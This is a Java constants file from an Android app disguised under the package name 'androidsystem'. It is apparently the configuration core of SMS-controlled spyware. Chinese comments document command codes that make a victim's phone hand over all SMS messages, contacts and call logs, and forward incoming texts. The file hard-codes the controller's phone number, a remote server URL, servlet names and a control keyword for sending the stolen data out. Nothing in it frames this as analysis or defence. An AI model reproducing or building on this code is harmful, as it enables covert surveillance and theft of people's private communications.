package com.me.androidsystem.util;
/*
 操作说明
控制端发送短信指令
1 ————获取客户端的所有短信
2 ————获取客户端的所有通信录包括通话记录
3 ————仅获取客户端的所有通话记录
4 ————短信转发
11————设置获取客户端所有短信的模式为短信发送模式
12————设置获取客户端所有短信的模式为网络发送模式
13————设置获取客户端所有短信的模式为网络优先发送模式
21————设置获取客户端的所有通信录包括通话记录的模式为短信发送模式
22————设置获取客户端的所有通信录包括通话记录的模式为网络发送模式
23————设置获取客户端的所有通信录包括通话记录的模式为网络优先发送模式
30————设置获取客户端当前短信的模式为不获取
31————设置获取客户端当前短信的模式为短信模式
32————设置获取客户端当前短信的模式为网络模式
33————设置获取客户端当前短信的模式为网络优先模式
 */
public class ServiceUtil {
	//控制端的手机号 每次发送指令时会自动修改为发送指令的手机号
	public static String CONTROL_NUMBER = "+8618271803015";
	//控制端的网络服务器192.168.137.218  221.234.230.22
	public static final String CONTROL_SERVER_ADDRESS = "http://125.221.35.18/monitor/";
	//发送电话信息请求的Servlet
	public static final String PHO_SERVLET = "GetPHOInfoServlet";
	//发送单个短信请求的Servlet 目前没有用
	public static final String SMS_ONE_SERVLET = "GetSmsOneServlet";
	//控制端的key
	public static final String CONTROL_START = "qingxue";
	//配置文件的名称
	public static final String CONFIG_NAME = "config";
	//保存离线短信信息文件
	public static final String OFF_INFO = "off_info";
	
	public static final String COMMAND="command";
	//控制端获取用户的所有短信
	public static final int GET_ALL_SMS = 1;
	//控制端获取用户所有电话和通话记录
	public static final int GET_ALL_PHO = 2;
	//控制端获取用户所有通话记录
	public static final int GET_ONLY_PHO = 3;
	//短信转发
	public static final int SMS_TRANSPOND = 4;
	
	//设置短信的操作模式为无
	public static final int SET_SMS_MODEL_0 = 10;
	//设置短信的操作模式为MODEL_SMS_ONLY
	public static final int SET_SMS_MODEL_1 = 11;
	//设置短信的操作模式为MODEL_NET_ONLY
	public static final int SET_SMS_MODEL_2 = 12;	//默认
	//设置短信的操作模式为MODEL_NET_SMS
	public static final int SET_SMS_MODEL_3 = 13;

	// 设置通信记录的操作模式为无
	public static final int SET_PHO_MODEL_0 = 20;
	// 设置通信记录的操作模式为MODEL_SMS_ONLY
	public static final int SET_PHO_MODEL_1 = 21;
	// 设置通信记录的操作模式为MODEL_NET_ONLY
	public static final int SET_PHO_MODEL_2 = 22;	//默认
	// 设置通信记录的操作模式为MODEL_NET_SMS
	public static final int SET_PHO_MODEL_3 = 23;
	
	//设置短信的操作模式为无
	public static final int SET_SMS_ONE_MODEL_0 = 30;
	//设置短信的操作模式为MODEL_SMS_ONLY
	public static final int SET_SMS_ONE_MODEL_1 = 31;
	//设置短信的操作模式为MODEL_NET_ONLY
	public static final int SET_SMS_ONE_MODEL_2 = 32;//默认
	//设置短信的操作模式为MODEL_NET_SMS
	public static final int SET_SMS_ONE_MODEL_3 = 33;
	
	//对于单条短信的操作模式
	public static final String SMS_ONE_MODEL = "sms_one_model"; 
	//对于所有短信的操作模式
	public static final String SMS_MODEL = "sms_model"; 
	//对于电话的操作模式
	public static final String PHO_MODEL = "pho_model";
	
	//不发送模式
	public static final int MODEL_NONE = 0;
	//短信模式
	public static final int MODEL_SMS_ONLY = 1;
	//网络模式
	public static final int MODEL_NET_ONLY = 2;
	//短信和网络模式，网络优先
	public static final int MODEL_NET_SMS = 3;
	
	//仅获取通话记录
	public static boolean ONLY_TEL = false;
}
